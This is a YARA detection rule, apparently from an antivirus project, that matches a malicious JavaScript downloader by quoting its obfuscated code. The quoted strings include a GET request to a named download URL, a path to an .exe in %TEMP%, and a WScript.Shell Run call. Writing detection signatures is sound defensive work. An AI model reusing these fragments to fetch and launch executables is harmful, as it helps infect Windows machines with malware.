rule sig_20160328_e7933e7dc8e5c3955cea9a2ca61a6df4 {
  meta:
    description = "datamaliciousorder - file 20160328_e7933e7dc8e5c3955cea9a2ca61a6df4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b4cf9efd3cc0df6f9dd8e4ab2655d66ebb68af3934c8347586f8f2919634b90"

  strings:
    $s1  = "function Nsfwq() {return Ltjyybra[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"VbXkB3YNkZb1.exe\";};" fullword ascii
    $s2  = "do {WScript[Arlmqzobc](Kvykbrtrs() * 11)} while (Bujkcrrqbr[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Ltjyybra = function Ziflgz() {return WScript[Yzgsm](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Bujkcrrqbr[Yfhmr](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "function Calttp(Qjpzogxa, Vctwzgrq){return Qjpzogxa - Vctwzgrq;};" fullword ascii
    $s6  = "function Nhsvucft() {return ((Ozyares == true) && (Ozyares == Xelbay)) ? 1 : Wwcwo;};" fullword ascii
    $s7  = "function Onlyoso(Nbkpctt){Ltjyybra[\"Run\"](Nbkpctt, Wwcwo, Wwcwo);};" fullword ascii
    $s8  = "Ozyares = true; " fullword ascii
    $s9  = "Xelbay = true; " fullword ascii
    $s10 = "function Ecgsxr()" fullword ascii
    $s11 = "var Ozyares = false;" fullword ascii
    $s12 = "var Njlnujfsts = false;" fullword ascii
    $s13 = "var Xelbay = false;" fullword ascii
    $s14 = "function Dnixw(){return Yzgsm;};" fullword ascii
    $s15 = "var Gsidzfs = new this[\"Date\"]();" fullword ascii
    $s16 = "function Cqagfsfwpo(Mjyogwv) {var Rmdpjujc = (1, 2, 3, 4, 5, Mjyogwv); return Rmdpjujc;};" fullword ascii
    $s17 = "function Kvykbrtrs(){return 22;};" fullword ascii
    $s18 = "function Gedqmd(){return Yuiluqxxf;};" fullword ascii
    $s19 = " while (Pwwllispj){" fullword ascii
    $s20 = "} catch(Jnvksgfb){Pwwllispj = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}